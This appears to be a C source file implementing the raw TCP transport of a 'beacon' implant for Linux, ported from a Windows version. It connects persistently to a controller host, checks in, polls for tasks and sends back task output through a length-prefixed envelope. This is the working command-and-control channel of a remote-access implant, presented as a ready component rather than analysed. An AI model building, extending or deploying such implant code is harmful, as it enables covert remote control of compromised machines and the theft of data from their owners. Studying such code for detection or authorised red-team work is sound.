// Raw TCP transport. Persistent socket; envelope: [u32 BE len][u8 type][payload].
// Linux port of beacon/transports/tcp/transport_tcp.c (WinSock -> POSIX sockets).

#include "../../core/beacon.h"
#include <string.h>
#include <unistd.h>
#include <errno.h>
#include <sys/socket.h>
#include <sys/types.h>
#include <netdb.h>
#include <netinet/tcp.h>

// Transport message types (mirror proto::tport::*)
#define TPORT_CHECKIN    1
#define TPORT_POLL       2
#define TPORT_TASKS      3
#define TPORT_OUTPUT     4
#define TPORT_ACK        5
#define TPORT_MAX_LEN    (16u * 1024u * 1024u)

// External UTF-8 accessors (defined in main.c)
extern const char* beacon_host(void);

static int g_sock = -1;

static void tcp_close_socket(void) {
    if (g_sock >= 0) { close(g_sock); g_sock = -1; }
}

static int tcp_connect_if_needed(void) {
    if (g_sock >= 0) return 0;

    const char* host = beacon_host();
    uint16_t port = beacon_state()->port;

    char port_str[8];
    int pn = 0;
    uint16_t pv = port;
    if (!pv) port_str[pn++] = '0';
    else { char t[8]; int m = 0; while (pv) { t[m++] = (char)('0' + pv % 10); pv /= 10; } while (m) port_str[pn++] = t[--m]; }
    port_str[pn] = 0;

    struct addrinfo hints;
    memset(&hints, 0, sizeof(hints));
    hints.ai_family   = AF_UNSPEC;
    hints.ai_socktype = SOCK_STREAM;
    struct addrinfo* res = NULL;
    if (getaddrinfo(host, port_str, &hints, &res) != 0 || !res) return -1;

    int s = -1;
    for (struct addrinfo* it = res; it; it = it->ai_next) {
        s = socket(it->ai_family, it->ai_socktype, it->ai_protocol);
        if (s < 0) continue;
        sock_nosigpipe(s);
        if (connect(s, it->ai_addr, it->ai_addrlen) == 0) break;
        close(s);
        s = -1;
    }
    freeaddrinfo(res);
    if (s < 0) return -1;

    // 30s timeout + TCP_NODELAY
    struct timeval tv = { .tv_sec = 30, .tv_usec = 0 };
    setsockopt(s, SOL_SOCKET, SO_RCVTIMEO, &tv, sizeof(tv));
    setsockopt(s, SOL_SOCKET, SO_SNDTIMEO, &tv, sizeof(tv));
    int one = 1;
    setsockopt(s, IPPROTO_TCP, TCP_NODELAY, &one, sizeof(one));

    g_sock = s;
    return 0;
}

static int tcp_send_all(const uint8_t* p, size_t n) {
    while (n) {
        ssize_t sent = send(g_sock, p, n, MSG_NOSIGNAL);
        if (sent <= 0) { tcp_close_socket(); return -1; }
        p += sent; n -= (size_t)sent;
    }
    return 0;
}

static int tcp_recv_all(uint8_t* p, size_t n) {
    while (n) {
        ssize_t got = recv(g_sock, p, n, 0);
        if (got <= 0) { tcp_close_socket(); return -1; }
        p += got; n -= (size_t)got;
    }
    return 0;
}

// Send envelope [u32 be len][u8 type][payload].
static int tcp_send_env(uint8_t type, const uint8_t* body, size_t body_len) {
    if (tcp_connect_if_needed() != 0) return -1;
    uint32_t total = (uint32_t)(1 + body_len);
    uint8_t hdr[5];
    hdr[0] = (uint8_t)(total >> 24);
    hdr[1] = (uint8_t)(total >> 16);
    hdr[2] = (uint8_t)(total >>  8);
    hdr[3] = (uint8_t) total;
    hdr[4] = type;
    if (tcp_send_all(hdr, 5) != 0) return -1;
    if (body_len && tcp_send_all(body, body_len) != 0) return -1;
    return 0;
}

// Receive envelope. Writes payload into out (capacity *out_len on entry).
static int tcp_recv_env(uint8_t* out_type, uint8_t* out, size_t* out_len) {
    uint8_t hdr[5];
    if (tcp_recv_all(hdr, 5) != 0) return -1;
    uint32_t total = ((uint32_t)hdr[0] << 24) | ((uint32_t)hdr[1] << 16)
                   | ((uint32_t)hdr[2] <<  8) |  (uint32_t)hdr[3];
    if (total < 1 || total > TPORT_MAX_LEN) { tcp_close_socket(); return -1; }
    *out_type = hdr[4];
    size_t body = total - 1;
    if (body > *out_len) { tcp_close_socket(); return -1; }
    if (body && tcp_recv_all(out, body) != 0) return -1;
    *out_len = body;
    return 0;
}

// ---- vtable -----------------------------------------------------------------

static int tcp_checkin(const uint8_t* frame, size_t flen,
                       uint8_t* out, size_t* out_len) {
    if (tcp_send_env(TPORT_CHECKIN, frame, flen) != 0) { *out_len = 0; return -1; }
    uint8_t typ = 0;
    if (tcp_recv_env(&typ, out, out_len) != 0) { *out_len = 0; return -1; }
    if (typ != TPORT_CHECKIN) { *out_len = 0; return -1; }
    return 0;
}

static int tcp_poll(uint8_t* out, size_t* out_len) {
    if (tcp_send_env(TPORT_POLL, NULL, 0) != 0) { *out_len = 0; return -1; }
    uint8_t typ = 0;
    if (tcp_recv_env(&typ, out, out_len) != 0) { *out_len = 0; return -1; }
    if (typ != TPORT_TASKS) { *out_len = 0; return -1; }
    return 0;
}

static int tcp_submit(const uint8_t* frame, size_t flen) {
    if (tcp_send_env(TPORT_OUTPUT, frame, flen) != 0) return -1;
    uint8_t scratch[16]; size_t slen = sizeof(scratch);
    uint8_t typ = 0;
    if (tcp_recv_env(&typ, scratch, &slen) != 0) return -1;
    return (typ == TPORT_ACK && slen == 0) ? 0 : -1;
}

static int tcp_connection_lost(void) { return g_sock < 0; }

const TransportVtbl g_transport_tcp = {
    .checkin         = tcp_checkin,
    .poll_tasks      = tcp_poll,
    .submit_output   = tcp_submit,
    .connection_lost = tcp_connection_lost,
};
